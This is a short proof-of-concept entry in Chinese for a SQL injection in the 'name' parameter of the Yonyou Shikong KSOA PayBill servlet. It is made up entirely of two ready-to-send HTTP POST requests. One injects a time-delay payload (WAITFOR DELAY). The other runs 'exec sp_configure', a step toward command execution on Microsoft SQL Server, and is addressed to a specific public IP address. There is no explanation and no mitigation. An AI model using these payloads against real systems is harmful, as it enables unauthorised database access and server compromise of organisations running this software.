# 用友-时空 KSOA PayBill 文件 name 参数 SQL 注入漏洞

    ```
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 134
Accept-Encoding: gzip, deflate
Connection: close

<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>
```



```
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
Host: 1.71.178.189:91
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Content-Length: 159

<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1';exec sp_configure 'show advanced options';--</name><name>1</name><name>100479</name></root>
```
